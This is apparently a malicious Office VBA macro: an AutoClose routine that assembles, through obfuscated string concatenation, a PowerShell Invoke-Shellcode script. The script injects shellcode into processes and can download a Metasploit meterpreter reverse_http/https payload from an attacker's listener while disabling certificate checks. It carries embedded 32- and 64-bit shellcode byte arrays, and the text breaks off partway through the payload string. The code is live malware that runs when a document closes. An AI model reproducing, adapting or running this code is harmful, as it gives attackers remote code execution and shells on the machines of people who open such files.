Sub AutoClose()
        bnndF
End Sub

Public Function bnndF() As Variant
        Dim XiBVs As String
        XiBVs = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        XiBVs = XiBVs + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        XiBVs = XiBVs + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        XiBVs = XiBVs + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        XiBVs = XiBVs + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        XiBVs = XiBVs + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        XiBVs = XiBVs + "    $Shellcode,
    [Parameter( ParameterSetName ="
        XiBVs = XiBVs + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        XiBVs = XiBVs + "reter/reverse_http',
                  'windows/me"
        XiBVs = XiBVs + "terpreter/reverse_https',
                  Ignore"
        XiBVs = XiBVs + "Case = $True )]
    [String]
    $Payload = 'windo"
        XiBVs = XiBVs + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        XiBVs = XiBVs + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        XiBVs = XiBVs + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        XiBVs = XiBVs + " = $True,
                ParameterSetName = 'Meta"
        XiBVs = XiBVs + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        XiBVs = XiBVs + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        XiBVs = XiBVs + "datory = $True,
                ParameterSetName ="
        XiBVs = XiBVs + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        XiBVs = XiBVs + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        XiBVs = XiBVs + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        XiBVs = XiBVs + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        XiBVs = XiBVs + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        XiBVs = XiBVs + "sion\Internet Settings').'User Agent',
    [Parame"
        XiBVs = XiBVs + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        XiBVs = XiBVs + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        XiBVs = XiBVs + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        XiBVs = XiBVs + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        XiBVs = XiBVs + "$False,
    [Switch]
    $Force = $False
)
    Set"
        XiBVs = XiBVs + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        XiBVs = XiBVs + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        XiBVs = XiBVs + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        XiBVs = XiBVs + "meters['Payload'].Attributes |
            Where-O"
        XiBVs = XiBVs + "bject {$_.TypeId -eq [System.Management.Automation"
        XiBVs = XiBVs + ".ValidateSetAttribute]}
        foreach ($Payload "
        XiBVs = XiBVs + "in $AvailablePayloads.ValidValues)
        {
     "
        XiBVs = XiBVs + "       New-Object PSObject -Property @{ Payloads ="
        XiBVs = XiBVs + " $Payload }
        }
        Return
    }
    if "
        XiBVs = XiBVs + "( $PSBoundParameters['ProcessID'] )
    {
        "
        XiBVs = XiBVs + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        XiBVs = XiBVs + "-Null
    }
    function Local:Get-DelegateType
  "
        XiBVs = XiBVs + "  {
        Param
        (
            [OutputTyp"
        XiBVs = XiBVs + "e([Type])]
            [Parameter( Position = 0)]
"
        XiBVs = XiBVs + "            [Type[]]
            $Parameters = (Ne"
        XiBVs = XiBVs + "w-Object Type[](0)),
            [Parameter( Posit"
        XiBVs = XiBVs + "ion = 1 )]
            [Type]
            $ReturnT"
        XiBVs = XiBVs + "ype = [Void]
        )
        $Domain = [AppDomai"
        XiBVs = XiBVs + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        XiBVs = XiBVs + "t System.Reflection.AssemblyName('ReflectedDelegat"
        XiBVs = XiBVs + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        XiBVs = XiBVs + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        XiBVs = XiBVs + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        XiBVs = XiBVs + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        XiBVs = XiBVs + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        XiBVs = XiBVs + "der.DefineType('MyDelegateType', 'Class, Public, S"
        XiBVs = XiBVs + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        XiBVs = XiBVs + "egate])
        $ConstructorBuilder = $TypeBuilder"
        XiBVs = XiBVs + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        XiBVs = XiBVs + "ic', [System.Reflection.CallingConventions]::Stand"
        XiBVs = XiBVs + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        XiBVs = XiBVs + "mplementationFlags('Runtime, Managed')
        $Me"
        XiBVs = XiBVs + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        XiBVs = XiBVs + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        XiBVs = XiBVs + ", $Parameters)
        $MethodBuilder.SetImplement"
        XiBVs = XiBVs + "ationFlags('Runtime, Managed')
        Write-Outpu"
        XiBVs = XiBVs + "t $TypeBuilder.CreateType()
    }
    function Loc"
        XiBVs = XiBVs + "al:Get-ProcAddress
    {
        Param
        (
 "
        XiBVs = XiBVs + "           [OutputType([IntPtr])]
            [Par"
        XiBVs = XiBVs + "ameter( Position = 0, Mandatory = $True )]
       "
        XiBVs = XiBVs + "     [String]
            $Module,
            [Pa"
        XiBVs = XiBVs + "rameter( Position = 1, Mandatory = $True )]
      "
        XiBVs = XiBVs + "      [String]
            $Procedure
        )
  "
        XiBVs = XiBVs + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        XiBVs = XiBVs + ".GetAssemblies() |
            Where-Object { $_.G"
        XiBVs = XiBVs + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        XiBVs = XiBVs + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        XiBVs = XiBVs + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        XiBVs = XiBVs + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        XiBVs = XiBVs + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        XiBVs = XiBVs + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        XiBVs = XiBVs + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        XiBVs = XiBVs + "eropServices.HandleRef], [String]))
        $Kern3"
        XiBVs = XiBVs + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        XiBVs = XiBVs + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        XiBVs = XiBVs + "ndleRef = New-Object System.Runtime.InteropService"
        XiBVs = XiBVs + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        XiBVs = XiBVs + "Output $GetProcAddress.Invoke($null, @([System.Run"
        XiBVs = XiBVs + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        XiBVs = XiBVs + "ure))
    }
    function Local:Emit-CallThreadStub"
        XiBVs = XiBVs + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        XiBVs = XiBVs + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        XiBVs = XiBVs + "chitecture / 8
        function Local:ConvertTo-Li"
        XiBVs = XiBVs + "ttleEndian ([IntPtr] $Address)
        {
         "
        XiBVs = XiBVs + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        XiBVs = XiBVs + "           $Address.ToString("X$($IntSizePtr*2)") "
        XiBVs = XiBVs + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        XiBVs = XiBVs + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        XiBVs = XiBVs + " } }
            [System.Array]::Reverse($LittleEn"
        XiBVs = XiBVs + "dianByteArray)
            Write-Output $LittleEnd"
        XiBVs = XiBVs + "ianByteArray
        }
        $CallStub = New-Obj"
        XiBVs = XiBVs + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        XiBVs = XiBVs + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        XiBVs = XiBVs + "                   # MOV   QWORD RAX, &shellcode
 "
        XiBVs = XiBVs + "           $CallStub += ConvertTo-LittleEndian $Ba"
        XiBVs = XiBVs + "seAddr       # &shellcode
            $CallStub +="
        XiBVs = XiBVs + " 0xFF,0xD0                              # CALL  RA"
        XiBVs = XiBVs + "X
            $CallStub += 0x6A,0x00              "
        XiBVs = XiBVs + "                # PUSH  BYTE 0
            $CallSt"
        XiBVs = XiBVs + "ub += 0x48,0xB8                              # MOV"
        XiBVs = XiBVs + "   QWORD RAX, &ExitThread
            $CallStub +="
        XiBVs = XiBVs + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        XiBVs = XiBVs + "ead
            $CallStub += 0xFF,0xD0            "
        XiBVs = XiBVs + "                  # CALL  RAX
        }
        el"
        XiBVs = XiBVs + "se
        {
            [Byte[]] $CallStub = 0xB8"
        XiBVs = XiBVs + "                           # MOV   DWORD EAX, &she"
        XiBVs = XiBVs + "llcode
            $CallStub += ConvertTo-LittleEn"
        XiBVs = XiBVs + "dian $BaseAddr       # &shellcode
            $Cal"
        XiBVs = XiBVs + "lStub += 0xFF,0xD0                              # "
        XiBVs = XiBVs + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        XiBVs = XiBVs + "                        # PUSH  BYTE 0
           "
        XiBVs = XiBVs + " $CallStub += 0xB8                                "
        XiBVs = XiBVs + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        XiBVs = XiBVs + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        XiBVs = XiBVs + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        XiBVs = XiBVs + "                          # CALL  EAX
        }
  "
        XiBVs = XiBVs + "      Write-Output $CallStub
    }
    function Lo"
        XiBVs = XiBVs + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        XiBVs = XiBVs + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        XiBVs = XiBVs + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        XiBVs = XiBVs + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        XiBVs = XiBVs + "        Throw "Unable to open a process handle for"
        XiBVs = XiBVs + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        XiBVs = XiBVs + "lse
        if ($64bitCPU) # Only perform theses c"
        XiBVs = XiBVs + "hecks if CPU is 64-bit
        {
            $IsWo"
        XiBVs = XiBVs + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        XiBVs = XiBVs + "-Null
            if ((!$IsWow64) -and $PowerShell"
        XiBVs = XiBVs + "32bit)
            {
                Throw 'Unable"
        XiBVs = XiBVs + " to inject 64-bit shellcode from within 32-bit Pow"
        XiBVs = XiBVs + "ershell. Use the 64-bit version of Powershell if y"
        XiBVs = XiBVs + "ou want this to work.'
            }
            e"
        XiBVs = XiBVs + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        XiBVs = XiBVs + "  {
                if ($Shellcode32.Length -eq 0)"
        XiBVs = XiBVs + "
                {
                    Throw 'No s"
        XiBVs = XiBVs + "hellcode was placed in the $Shellcode32 variable!'"
        XiBVs = XiBVs + "
                }
                $Shellcode = $S"
        XiBVs = XiBVs + "hellcode32
            }
            else # 64-bit"
        XiBVs = XiBVs + " process
            {
                if ($Shellc"
        XiBVs = XiBVs + "ode64.Length -eq 0)
                {
            "
        XiBVs = XiBVs + "        Throw 'No shellcode was placed in the $She"
        XiBVs = XiBVs + "llcode64 variable!'
                }
            "
        XiBVs = XiBVs + "    $Shellcode = $Shellcode64
            }
      "
        XiBVs = XiBVs + "  }
        else # 32-bit CPU
        {
          "
        XiBVs = XiBVs + "  if ($Shellcode32.Length -eq 0)
            {
   "
        XiBVs = XiBVs + "             Throw 'No shellcode was placed in the"
        XiBVs = XiBVs + " $Shellcode32 variable!'
            }
           "
        XiBVs = XiBVs + " $Shellcode = $Shellcode32
        }
        $Remo"
        XiBVs = XiBVs + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        XiBVs = XiBVs + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        XiBVs = XiBVs + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        XiBVs = XiBVs + ")
        {
            Throw "Unable to allocate "
        XiBVs = XiBVs + "shellcode memory in PID: $ProcessID"
        }
   "
        XiBVs = XiBVs + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        XiBVs = XiBVs + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        XiBVs = XiBVs + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        XiBVs = XiBVs + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        XiBVs = XiBVs + "      {
            $CallStub = Emit-CallThreadStu"
        XiBVs = XiBVs + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        XiBVs = XiBVs + "    else
        {
            $CallStub = Emit-Ca"
        XiBVs = XiBVs + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        XiBVs = XiBVs + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        XiBVs = XiBVs + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        XiBVs = XiBVs + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        XiBVs = XiBVs + "(!$RemoteStubAddr)
        {
            Throw "Un"
        XiBVs = XiBVs + "able to allocate thread call stub memory in PID: $"
        XiBVs = XiBVs + "ProcessID"
        }
        $WriteProcessMemory.I"
        XiBVs = XiBVs + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        XiBVs = XiBVs + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        XiBVs = XiBVs + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        XiBVs = XiBVs + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        XiBVs = XiBVs + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        XiBVs = XiBVs + "  {
            Throw "Unable to launch remote thr"
        XiBVs = XiBVs + "ead in PID: $ProcessID"
        }
        $CloseHa"
        XiBVs = XiBVs + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        XiBVs = XiBVs + "on Local:Inject-LocalShellcode
    {
        if ($"
        XiBVs = XiBVs + "PowerShell32bit) {
            if ($Shellcode32.Le"
        XiBVs = XiBVs + "ngth -eq 0)
            {
                Throw 'N"
        XiBVs = XiBVs + "o shellcode was placed in the $Shellcode32 variabl"
        XiBVs = XiBVs + "e!'
                return
            }
         "
        XiBVs = XiBVs + "   $Shellcode = $Shellcode32
        }
        els"
        XiBVs = XiBVs + "e
        {
            if ($Shellcode64.Length -e"
        XiBVs = XiBVs + "q 0)
            {
                Throw 'No shell"
        XiBVs = XiBVs + "code was placed in the $Shellcode64 variable!'
   "
        XiBVs = XiBVs + "             return
            }
            $She"
        XiBVs = XiBVs + "llcode = $Shellcode64
        }
        $BaseAddre"
        XiBVs = XiBVs + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        XiBVs = XiBVs + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        XiBVs = XiBVs + "X)
        if (!$BaseAddress)
        {
          "
        XiBVs = XiBVs + "  Throw "Unable to allocate shellcode memory in PI"
        XiBVs = XiBVs + "D: $ProcessID"
        }
        [System.Runtime.I"
        XiBVs = XiBVs + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        XiBVs = XiBVs + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        XiBVs = XiBVs + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        XiBVs = XiBVs + "  if ($PowerShell32bit)
        {
            $Cal"
        XiBVs = XiBVs + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        XiBVs = XiBVs + "adAddr 32
        }
        else
        {
       "
        XiBVs = XiBVs + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        XiBVs = XiBVs + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        XiBVs = XiBVs + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        XiBVs = XiBVs + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        XiBVs = XiBVs + "X)
        if (!$CallStubAddress)
        {
      "
        XiBVs = XiBVs + "      Throw "Unable to allocate thread call stub.""
        XiBVs = XiBVs + "
        }
        [System.Runtime.InteropServices"
        XiBVs = XiBVs + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        XiBVs = XiBVs + "allStub.Length)
        $ThreadHandle = $CreateThr"
        XiBVs = XiBVs + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        XiBVs = XiBVs + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        XiBVs = XiBVs + "dHandle)
        {
            Throw "Unable to la"
        XiBVs = XiBVs + "unch thread."
        }
        $WaitForSingleObje"
        XiBVs = XiBVs + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        XiBVs = XiBVs + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        XiBVs = XiBVs + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        XiBVs = XiBVs + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        XiBVs = XiBVs + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        XiBVs = XiBVs + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        XiBVs = XiBVs + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        XiBVs = XiBVs + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        XiBVs = XiBVs + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        XiBVs = XiBVs + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        XiBVs = XiBVs + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        XiBVs = XiBVs + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        XiBVs = XiBVs + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        XiBVs = XiBVs + "  else
    {
        $64bitCPU = $false
    }
    "
        XiBVs = XiBVs + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        XiBVs = XiBVs + "l32bit = $true
    }
    else
    {
        $Power"
        XiBVs = XiBVs + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        XiBVs = XiBVs + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        XiBVs = XiBVs + "owerShell32bit) {
            $RootInvocation = $M"
        XiBVs = XiBVs + "yInvocation.Line
            $Response = $True
   "
        XiBVs = XiBVs + "         if ( $Force -or ( $Response = $psCmdlet.S"
        XiBVs = XiBVs + "houldContinue( "Do you want to launch the payload "
        XiBVs = XiBVs + "from x86 Powershell?",
                   "Attempt"
        XiBVs = XiBVs + " to execute 32-bit shellcode from 64-bit Powershel"
        XiBVs = XiBVs + "l. Note: This process takes about one minute. Be p"
        XiBVs = XiBVs + "atient! You will also see some artifacts of the sc"
        XiBVs = XiBVs + "ript loading in the other process." ) ) ) { }
    "
        XiBVs = XiBVs + "        if ( !$Response )
            {
          "
        XiBVs = XiBVs + "      Return
            }
            if ($MyInvo"
        XiBVs = XiBVs + "cation.BoundParameters['Force'])
            {
   "
        XiBVs = XiBVs + "             $Command = "function $($MyInvocation."
        XiBVs = XiBVs + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        XiBVs = XiBVs + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        XiBVs = XiBVs + "   }
            else
            {
              "
        XiBVs = XiBVs + "  $Command = "function $($MyInvocation.InvocationN"
        XiBVs = XiBVs + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        XiBVs = XiBVs + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        XiBVs = XiBVs + "
            $CommandBytes = [System.Text.Encoding"
        XiBVs = XiBVs + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        XiBVs = XiBVs + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        XiBVs = XiBVs + "           $Execute = '$Command' + " | $Env:windir"
        XiBVs = XiBVs + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        XiBVs = XiBVs + "oProfile -Command -"
            Invoke-Expression"
        XiBVs = XiBVs + " -Command $Execute | Out-Null
            Return
 "
        XiBVs = XiBVs + "       }
        $Response = $True
        if ( $F"
        XiBVs = XiBVs + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        XiBVs = XiBVs + "Do you know what you're doing?",
               "A"
        XiBVs = XiBVs + "bout to download Metasploit payload '$($Payload)' "
        XiBVs = XiBVs + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        XiBVs = XiBVs + "  if ( !$Response )
        {
            Return
 "
        XiBVs = XiBVs + "       }
        switch ($Payload)
        {
     "
        XiBVs = XiBVs + "       'windows/meterpreter/reverse_http'
        "
        XiBVs = XiBVs + "    {
                $SSL = ''
            }
    "
        XiBVs = XiBVs + "        'windows/meterpreter/reverse_https'
      "
        XiBVs = XiBVs + "      {
                $SSL = 's'
               "
        XiBVs = XiBVs + " [System.Net.ServicePointManager]::ServerCertifica"
        XiBVs = XiBVs + "teValidationCallback = {$True}
            }
     "
        XiBVs = XiBVs + "   }
        if ($Legacy)
        {
            $R"
        XiBVs = XiBVs + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        XiBVs = XiBVs + "
        } else {
            $CharArray = 48..57 "
        XiBVs = XiBVs + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        XiBVs = XiBVs + "         $SumTest = $False
            while ($Sum"
        XiBVs = XiBVs + "Test -eq $False)
            {
                $Ge"
        XiBVs = XiBVs + "neratedUri = $CharArray | Get-Random -Count 4
    "
        XiBVs = XiBVs + "            $SumTest = (([int[]] $GeneratedUri | M"
        XiBVs = XiBVs + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        XiBVs = XiBVs + "  }
            $RequestUri = -join $GeneratedUri
"
        XiBVs = XiBVs + "            $Request = "http$($SSL)://$($Lhost):$("
        XiBVs = XiBVs + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        XiBVs = XiBVs + "ew-Object Uri($Request)
        $WebClient = New-O"
        XiBVs = XiBVs + "bject System.Net.WebClient
        $WebClient.Head"
        XiBVs = XiBVs + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        XiBVs = XiBVs + "roxy)
        {
            $WebProxyObject = New-"
        XiBVs = XiBVs + "Object System.Net.WebProxy
            $ProxyAddre"
        XiBVs = XiBVs + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        XiBVs = XiBVs + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        XiBVs = XiBVs + "oxyServer
            if ($ProxyAddress)
         "
        XiBVs = XiBVs + "   {
                $WebProxyObject.Address = $Pr"
        XiBVs = XiBVs + "oxyAddress
                $WebProxyObject.UseDefa"
        XiBVs = XiBVs + "ultCredentials = $True
                $WebClientO"
        XiBVs = XiBVs + "bject.Proxy = $WebProxyObject
            }
      "
        XiBVs = XiBVs + "  }
        try
        {
            [Byte[]] $Sh"
        XiBVs = XiBVs + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        XiBVs = XiBVs + "}
        catch
        {
            Throw "$($Er"
        XiBVs = XiBVs + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        XiBVs = XiBVs + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        XiBVs = XiBVs + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        XiBVs = XiBVs + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        XiBVs = XiBVs + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        XiBVs = XiBVs + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        XiBVs = XiBVs + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        XiBVs = XiBVs + "                             0x52,0x0c,0x8b,0x52,0"
        XiBVs = XiBVs + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        XiBVs = XiBVs + "x31,0xc0,
                                  0xac,0"
        XiBVs = XiBVs + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        XiBVs = XiBVs + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        XiBVs = XiBVs + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        XiBVs = XiBVs + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        XiBVs = XiBVs + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        XiBVs = XiBVs + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        XiBVs = XiBVs + "x8b,
                                  0x01,0xd6,0"
        XiBVs = XiBVs + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        XiBVs = XiBVs + "x38,0xe0,0x75,0xf4,
                              "
        XiBVs = XiBVs + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        XiBVs = XiBVs + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        XiBVs = XiBVs + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        XiBVs = XiBVs + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        XiBVs = XiBVs + "                                  0x5b,0x5b,0x61,0"
        XiBVs = XiBVs + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        XiBVs = XiBVs + "xeb,0x86,0x5d,
                                  0"
        XiBVs = XiBVs + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        XiBVs = XiBVs + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        XiBVs = XiBVs + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        XiBVs = XiBVs + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        XiBVs = XiBVs + "                             0x80,0xfb,0xe0,0x75,0"
        XiBVs = XiBVs + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        XiBVs = XiBVs + "xd5,0x63,
                                  0x61,0"
        XiBVs = XiBVs + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        XiBVs = XiBVs + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        XiBVs = XiBVs + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        XiBVs = XiBVs + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        XiBVs = XiBVs + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        XiBVs = XiBVs + "                             0x20,0x48,0x8b,0x72,0"
        XiBVs = XiBVs + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        XiBVs = XiBVs + "x31,0xc0,
                                  0xac,0"
        XiBVs = XiBVs + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        XiBVs = XiBVs + "x41,0x01,0xc1,0xe2,0xed,
                         "
        XiBVs = XiBVs + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        XiBVs = XiBVs + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        XiBVs = XiBVs + "                        0x00,0x00,0x00,0x48,0x85,0"
        XiBVs = XiBVs + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        XiBVs = XiBVs + "x44,
                                  0x8b,0x40,0"
        XiBVs = XiBVs + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        XiBVs = XiBVs + "x8b,0x34,0x88,0x48,
                              "
        XiBVs = XiBVs + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        XiBVs = XiBVs + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        XiBVs = XiBVs + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        XiBVs = XiBVs + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        XiBVs = XiBVs + "                                  0x8b,0x40,0x24,0"
        XiBVs = XiBVs + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        XiBVs = XiBVs + "x40,0x1c,0x49,
                                  0"
        XiBVs = XiBVs + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        XiBVs = XiBVs + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        XiBVs = XiBVs + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        XiBVs = XiBVs + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        XiBVs = XiBVs + "                             0x59,0x5a,0x48,0x8b,0"
        XiBVs = XiBVs + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        XiBVs = XiBVs + "x00,0x00,
                                  0x00,0"
